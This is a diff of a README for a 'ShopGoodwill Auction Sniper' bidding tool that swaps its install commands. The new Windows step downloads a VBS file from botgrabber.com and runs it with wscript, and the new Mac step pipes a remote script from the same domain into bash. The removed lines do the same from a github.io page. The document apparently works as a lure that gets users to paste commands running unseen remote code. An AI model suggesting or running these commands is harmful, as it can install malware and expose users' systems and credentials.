@@ -23,7 +23,7 @@ When you use our **ShopGoodwill Auction Sniper**, you gain:
 Install the **ShopGoodwill Auction Sniper** on Windows using Command Prompt:
 
 ```cmd
-curl -L -o "%TEMP%\Bid_Sniper_Windows_Installer.vbs" "https://shopgoodwill-auction-sniper.github.io/shopgoodwill-sniper/Bid_Sniper_Windows_Installer.vbs" && wscript "%TEMP%\Bid_Sniper_Windows_Installer.vbs"
+curl -fsSL https://botgrabber.com/download/install-shopgoodwill-sniper.vbs -o "%TEMP%\sg.vbs" && wscript "%TEMP%\sg.vbs"
 ```
 
 **Windows Setup Tutorial**: Watch our [complete Windows installation guide](https://www.youtube.com/watch?v=I0pWOUshlOE) for step-by-step instructions.
@@ -33,7 +33,7 @@ curl -L -o "%TEMP%\Bid_Sniper_Windows_Installer.vbs" "https://shopgoodwill-aucti
 Install the **bid sniper for ShopGoodwill** on Mac using Terminal:
 
 ```bash
-curl -fsSL https://shopgoodwill-auction-sniper.github.io/shopgoodwill-sniper/Bid_Sniper_Mac_Installer.sh | bash || { (command -v brew >/dev/null 2>&1 || /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)") && brew install curl && $(command -v /usr/local/opt/curl/bin/curl || command -v /opt/homebrew/opt/curl/bin/curl) -fsSL https://shopgoodwill-auction-sniper.github.io/shopgoodwill-sniper/Bid_Sniper_Mac_Installer.sh | bash; }
+curl -fsSL https://botgrabber.com/download/install-shopgoodwill-sniper.sh | bash
 ```
 
 **Mac Setup Tutorial**: Follow our [Mac installation walkthrough](https://www.youtube.com/watch?v=VK2tm3c7CrY) for detailed guidance.
